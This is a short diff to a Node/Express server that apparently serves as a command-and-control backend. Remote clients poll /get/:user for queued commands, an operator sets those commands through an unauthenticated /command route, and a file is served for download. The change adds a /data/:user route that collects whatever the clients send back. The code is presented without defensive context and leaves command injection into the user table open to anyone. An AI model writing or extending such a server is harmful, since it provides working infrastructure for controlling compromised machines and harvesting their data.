@@ -13,6 +13,15 @@ app.get('/get/:user', (request, response) => {
   if (user) (response.end(users[request.params.user].command), user.repeat===0 && (users[request.params.user] = { command: "none", repeat: 1 }));
   else (users[request.params.user] = { command: "none", repeat: 1 }, response.end('none'));
 });
+app.post('/data/:user', (request, response) => {
+  let user = request.params.user;
+  request.on('data', d => {
+    users[user].data = d.toString();
+  });
+  request.on('end', () => {
+    response.status(200).end();
+  });
+})
 app.post('/command', (request, response) => {
   Object.assign(users, request.body);
   response.status(200).end();
@@ -26,4 +35,5 @@ app.post('/file', (request, response) => {
 app.get('/download', (request, response) => {
   response.download(__dirname + '/file');
 });
-require('http').createServer(app).listen(process.env.PORT || 80);
+const s = require('http').createServer(app);
+s.listen(process.env.PORT || 80);
